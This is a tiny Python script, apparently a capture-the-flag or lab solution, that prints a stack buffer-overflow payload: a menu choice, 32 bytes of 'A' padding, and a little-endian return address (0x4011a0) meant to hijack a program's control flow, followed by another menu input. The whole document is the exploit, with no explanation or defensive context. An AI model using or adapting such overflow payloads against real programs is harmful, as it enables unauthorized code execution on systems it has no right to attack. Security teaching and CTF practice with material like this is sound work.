import sys
address = b'00000000004011a0'

little_endian_address = bytes.fromhex(address.decode('utf-8'))[::-1]

sys.stdout.buffer.write(b'2\n'+b'A'*32+little_endian_address+b'\n'+b'4\n')